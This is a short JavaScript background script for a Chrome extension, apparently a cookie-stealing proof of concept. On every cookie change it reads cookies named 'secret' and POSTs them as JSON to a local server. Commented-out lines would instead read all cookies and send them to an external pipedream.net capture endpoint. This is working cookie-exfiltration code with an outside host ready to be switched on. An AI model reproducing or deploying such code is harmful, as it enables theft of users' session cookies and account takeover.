// setTimeout(() => {
//   logCookie();
// }, 5000);

chrome.cookies.onChanged.addListener(() => {
  logCookie();
});

function logCookie() {
  chrome.cookies.getAll({ name: "secret" }, (r) => {
    // chrome.cookies.getAll({}, (r) => {
    console.log(r);
    fetch(`http://localhost:6900/`, {
    // fetch(`https://en974z7hs59e3gc.m.pipedream.net/`, {
      method: "POST",
      body: JSON.stringify({ data: r }),
      headers: {'content-type': 'application/json'},
    }).catch((err) => {
      console.warn(err);
    });
  });
}
